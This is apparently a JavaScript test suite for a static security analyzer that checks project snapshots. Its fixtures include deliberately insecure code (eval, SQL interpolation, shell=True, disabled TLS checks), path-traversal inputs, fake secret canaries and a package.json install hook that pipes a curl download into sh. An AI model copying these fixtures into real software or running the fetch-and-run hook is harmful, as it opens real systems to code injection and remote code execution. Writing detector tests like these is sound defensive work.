import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import test from 'node:test';
import {
	analyzeDrytisProjectSnapshot,
	analyzeProjectSnapshot,
	buildWhiteBoxRepairPrompt,
	validateDrytisProjectSnapshot,
	validateProjectSnapshot,
	WHITEBOX_ANALYSIS_SCHEMA_VERSION,
	WHITEBOX_SNAPSHOT_LIMITS,
	WHITEBOX_SNAPSHOT_SCHEMA_VERSION,
	WHITEBOX_VALIDATION_CODES,
	WhiteBoxSnapshotValidationError
} from './whiteboxAnalysis.js';

function sourceFile(path, content, overrides = {}) {
	return {
		path,
		content,
		sha256: createHash('sha256').update(content, 'utf8').digest('hex'),
		sizeBytes: Buffer.byteLength(content, 'utf8'),
		...overrides
	};
}

function snapshot(files, overrides = {}) {
	return {
		schemaVersion: WHITEBOX_SNAPSHOT_SCHEMA_VERSION,
		project: { id: 'drytis-project-42', name: 'Example full-stack product', revision: 'git:abc123' },
		files,
		...overrides
	};
}

function validationError(code) {
	return error => error instanceof WhiteBoxSnapshotValidationError && error.code === code;
}

test('validates, content-addresses, normalizes, and deterministically inventories a bounded manifest', () => {
	const files = [
		sourceFile('src/api.ts', 'export const ok = true;\n'),
		sourceFile('backend/app.py', 'def health():\n    return {"ok": True}\n'),
		sourceFile('package.json', '{"name":"demo","dependencies":{"express":"^5.0.0"}}\n')
	];
	const validated = validateDrytisProjectSnapshot(snapshot([...files].reverse()));
	const report = analyzeDrytisProjectSnapshot(snapshot(files));
	const reversed = analyzeProjectSnapshot(snapshot([...files].reverse()));

	assert.equal(validateProjectSnapshot, validateDrytisProjectSnapshot);
	assert.equal(analyzeProjectSnapshot, analyzeDrytisProjectSnapshot);
	assert.deepEqual(validated.files.map(file => file.path), ['backend/app.py', 'package.json', 'src/api.ts']);
	assert.match(validated.snapshotSha256, /^sha256:[a-f0-9]{64}$/);
	assert.equal(report.schemaVersion, WHITEBOX_ANALYSIS_SCHEMA_VERSION);
	assert.equal(report.analysisId, reversed.analysisId);
	assert.equal(report.analysisSha256, reversed.analysisSha256);
	assert.equal(report.snapshotSha256, reversed.snapshotSha256);
	assert.equal(report.inventory.fileCount, 3);
	assert.equal(report.inventory.byLanguage.python, 1);
	assert.equal(report.inventory.byLanguage.typescript, 1);
	assert.equal(report.coverage.filesReceived, 3);
	assert.equal(report.coverage.filesAnalyzed, 3);
	assert.ok(report.coverage.fileCoverage.find(file => file.path === 'src/api.ts').rulesEvaluated.includes('js.dynamic-eval'));
	assert.ok(report.coverage.limitations.some(item => /not executed/i.test(item)));
	assert.equal(JSON.stringify(report).includes('export const ok'), false, 'analysis output must not contain complete received source');
	assert.equal(report.verdict, 'no_deterministic_findings');
});

test('produces conservative cross-stack findings with path/line evidence and safe repair prompts', () => {
	const manifest = snapshot([
		sourceFile('web/controller.ts', [
			'const result = eval(userInput);',
			'items.forEach(async item => await save(item));',
			'db.query(`SELECT * FROM users WHERE id = ${userId}`);',
			'app.use(express.json());'
		].join('\n')),
		sourceFile('api/service.py', [
			'import subprocess',
			'subprocess.run(command, shell=True)',
			'data = yaml.load(payload)',
			'response = requests.get(url, verify=False)',
			'cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")'
		].join('\n')),
		sourceFile('package.json', JSON.stringify({
			name: 'unsafe-demo',
			scripts: { install: 'curl https://downloads.example.invalid/install.sh | sh' },
			dependencies: { demo: '*' }
		}, null, 2)),
		sourceFile('tsconfig.json', '{\n  "compilerOptions": { "strict": false }\n}\n'),
		sourceFile('.github/workflows/ci.yml', 'permissions: write-all\ndebug: true\n'),
		sourceFile('Dockerfile', 'FROM node:latest\nCOPY . /app\nCMD ["node", "app.js"]\n')
	]);
	const report = analyzeDrytisProjectSnapshot(manifest);
	const rules = new Set(report.findings.map(finding => finding.ruleId));

	for (const expected of [
		'js.dynamic-eval', 'js.async-foreach', 'js.sql-interpolation', 'config.unbounded-json-body',
		'python.shell-command', 'python.unsafe-yaml', 'python.unverified-tls', 'python.sql-interpolation',
		'package.unbounded-dependency', 'package.pipe-to-shell', 'tsconfig.strict-disabled',
		'config.workflow-write-all', 'config.debug-enabled', 'docker.mutable-base-image', 'docker.root-user'
	]) assert.equal(rules.has(expected), true, `expected ${expected}`);

	assert.equal(report.verdict, 'issues_found');
	assert.ok(report.summary.high >= 7);
	assert.equal(report.repairPrompts.length, report.findings.length);
	for (const finding of report.findings) {
		assert.match(finding.id, /^WB-[A-F0-9]{12}$/);
		assert.ok(finding.evidence.path);
		assert.ok(finding.evidence.startLine >= 1);
		assert.ok(finding.evidence.snippet.length <= 240);
		assert.match(finding.repairPrompt, new RegExp(finding.id));
		assert.match(finding.repairPrompt, /do not introduce or expose credentials/i);
		assert.doesNotMatch(finding.repairPrompt, /const result = eval/);
		assert.equal(buildWhiteBoxRepairPrompt(finding), finding.repairPrompt);
	}
	const order = { critical: 0, high: 1, medium: 2, low: 3 };
	assert.equal(report.findings.every((item, index) => index === 0 || order[report.findings[index - 1].severity] <= order[item.severity]), true);
});

test('language-unsupported source is screened but never represented as substantive white-box coverage', () => {
	const report = analyzeDrytisProjectSnapshot(snapshot([
		sourceFile('cmd/server/main.go', 'package main\n\nfunc main() {}\n')
	]));
	assert.equal(report.coverage.filesReceived, 1);
	assert.equal(report.coverage.filesScreened, 1);
	assert.equal(report.coverage.filesAnalyzed, 0);
	assert.equal(report.coverage.filesWithoutLanguageRules, 1);
	assert.equal(report.coverage.linesReviewed, 0);
	assert.equal(report.coverage.fileCoverage[0].analysisLevel, 'manifest_secret_gate_only');
	assert.equal(report.verdict, 'insufficient_static_coverage');
	assert.match(report.coverage.limitations.join(' '), /no language-specific rules/i);
});

test('rejects traversal, absolute, non-POSIX, encoded, reserved, and duplicate paths', () => {
	for (const unsafe of ['../escape.js', '/root/file.js', 'C:/temp/file.js', 'src\\file.js', 'src/%2e%2e/file.js', 'src//file.js', 'src/CON.js']) {
		assert.throws(() => validateProjectSnapshot(snapshot([sourceFile(unsafe, 'ok')])), validationError(WHITEBOX_VALIDATION_CODES.UNSAFE_PATH), unsafe);
	}
	assert.throws(() => validateProjectSnapshot(snapshot([
		sourceFile('src/App.ts', 'one'),
		sourceFile('src/app.ts', 'two')
	])), validationError(WHITEBOX_VALIDATION_CODES.DUPLICATE_PATH));
});

test('rejects unsupported types, binary-like data, private-key containers, and invalid manifest shapes', () => {
	assert.throws(() => validateProjectSnapshot(snapshot([sourceFile('assets/logo.png', 'not really a png')])) , validationError(WHITEBOX_VALIDATION_CODES.UNSUPPORTED_FILE_TYPE));
	assert.throws(() => validateProjectSnapshot(snapshot([sourceFile('src/data.txt', 'hello\u0000world')])) , validationError(WHITEBOX_VALIDATION_CODES.BINARY_CONTENT));
	assert.throws(() => validateProjectSnapshot(snapshot([sourceFile('.env', 'SAFE={{PLACEHOLDER}}')])) , validationError(WHITEBOX_VALIDATION_CODES.SECRET_DETECTED));
	assert.throws(() => validateProjectSnapshot(snapshot([sourceFile('certificates/service.pem', 'text')])) , validationError(WHITEBOX_VALIDATION_CODES.SECRET_DETECTED));
	assert.throws(() => validateProjectSnapshot({ ...snapshot([sourceFile('app.js', 'ok')]), unexpected: true }), validationError(WHITEBOX_VALIDATION_CODES.INVALID_MANIFEST));
	assert.throws(() => validateProjectSnapshot(snapshot([sourceFile('app.js', 'ok', { extra: true })])), validationError(WHITEBOX_VALIDATION_CODES.INVALID_FILE));
	assert.throws(() => validateProjectSnapshot(snapshot([sourceFile('app.js', 'ok')], { schemaVersion: 'old' })), validationError(WHITEBOX_VALIDATION_CODES.UNSUPPORTED_SCHEMA));
	assert.throws(() => validateProjectSnapshot(snapshot([])), validationError(WHITEBOX_VALIDATION_CODES.INVALID_MANIFEST));
});

test('enforces byte limits, declared sizes, and cryptographic content integrity', () => {
	const content = 'const ok = true;';
	assert.throws(() => validateProjectSnapshot(snapshot([sourceFile('app.js', content, { sizeBytes: 1 })])), validationError(WHITEBOX_VALIDATION_CODES.SIZE_MISMATCH));
	assert.throws(() => validateProjectSnapshot(snapshot([sourceFile('app.js', content, { sha256: 'not-a-digest' })])), validationError(WHITEBOX_VALIDATION_CODES.INVALID_DIGEST));
	assert.throws(() => validateProjectSnapshot(snapshot([sourceFile('app.js', content, { sha256: 'a'.repeat(64) })])), validationError(WHITEBOX_VALIDATION_CODES.DIGEST_MISMATCH));
	const oversized = 'a'.repeat(WHITEBOX_SNAPSHOT_LIMITS.maxFileBytes + 1);
	assert.throws(() => validateProjectSnapshot(snapshot([sourceFile('large.txt', oversized)])), validationError(WHITEBOX_VALIDATION_CODES.FILE_SIZE_LIMIT));
});

test('rejects likely secrets without echoing values and accepts environment placeholders', () => {
	const secret = 'prod-live-value-ThatMustNeverEcho-928374';
	let captured;
	try {
		validateProjectSnapshot(snapshot([sourceFile('config.ts', `const apiKey = "${secret}";`)]));
	} catch (error) {
		captured = error;
	}
	assert.ok(captured instanceof WhiteBoxSnapshotValidationError);
	assert.equal(captured.code, WHITEBOX_VALIDATION_CODES.SECRET_DETECTED);
	assert.equal(captured.details.path, 'config.ts');
	assert.equal(captured.details.line, 1);
	assert.equal(JSON.stringify(captured).includes(secret), false);
	assert.equal(captured.message.includes(secret), false);

	const placeholder = 'export const apiKey = "{{DRYTIS_API_KEY}}";\nexport const password = "process.env.PASSWORD";\n';
	assert.doesNotThrow(() => validateProjectSnapshot(snapshot([sourceFile('safe-config.ts', placeholder)])));
	const providerTokenCanary = `const key = "${'gh' + 'p_'}abcdefghijklmnopqrstuvwxyz123456";`;
	const privateKeyCanary = `${'-----BE' + 'GIN PRIVATE ' + 'KEY-----'}\nabc\n${'-----END PRIVATE ' + 'KEY-----'}`;
	const genericSecretCanary = `const ${'sec' + 'ret'} = "my-production-secret-value";`;
	const jwtCanary = ['eyJhbGciOiJIUzI1NiJ9', 'eyJzdWIiOiJ1c2VyLTEyMyJ9', 'signaturevalue123'].join('.');
	assert.throws(() => validateProjectSnapshot(snapshot([sourceFile('key.ts', providerTokenCanary)])), validationError(WHITEBOX_VALIDATION_CODES.SECRET_DETECTED));
	assert.throws(() => validateProjectSnapshot(snapshot([sourceFile('private.txt', privateKeyCanary)])), validationError(WHITEBOX_VALIDATION_CODES.SECRET_DETECTED));
	assert.throws(() => validateProjectSnapshot(snapshot([sourceFile('secret.ts', genericSecretCanary)])), validationError(WHITEBOX_VALIDATION_CODES.SECRET_DETECTED));
	assert.throws(() => validateProjectSnapshot(snapshot([sourceFile('token.txt', jwtCanary)])), validationError(WHITEBOX_VALIDATION_CODES.SECRET_DETECTED));
});

test('invalid JSON is a cited finding rather than an analyzer crash', () => {
	const report = analyzeProjectSnapshot(snapshot([sourceFile('config.json', '{\n  "enabled": true,\n}\n')]));
	const finding = report.findings.find(item => item.ruleId === 'config.invalid-json');
	assert.ok(finding);
	assert.equal(finding.evidence.path, 'config.json');
	assert.ok(finding.evidence.startLine >= 1);
	assert.equal(report.summary.high, 1);
});

test('repair prompt builder refuses forged or unknown findings', () => {
	assert.throws(() => buildWhiteBoxRepairPrompt({ ruleId: 'unknown', evidence: { path: 'app.js', startLine: 1, endLine: 1 } }), /recognized white-box finding/);
});

test('bounds retained findings and repair prompts while reporting truncated static evidence', () => {
	const content = Array.from(
		{ length: WHITEBOX_SNAPSHOT_LIMITS.maxFindings + 5 },
		(_value, index) => `const issue${index} = eval(input${index});`
	).join('\n');
	const report = analyzeProjectSnapshot(snapshot([sourceFile('many-issues.js', content)]));
	assert.equal(report.findings.length, WHITEBOX_SNAPSHOT_LIMITS.maxFindings);
	assert.equal(report.repairPrompts.length, WHITEBOX_SNAPSHOT_LIMITS.maxFindings);
	assert.equal(report.summary.truncated, true);
	assert.ok(report.coverage.limitations.some(item => /capped/i.test(item)));
	assert.ok(Buffer.byteLength(JSON.stringify(report), 'utf8') < 1_000_000);
});
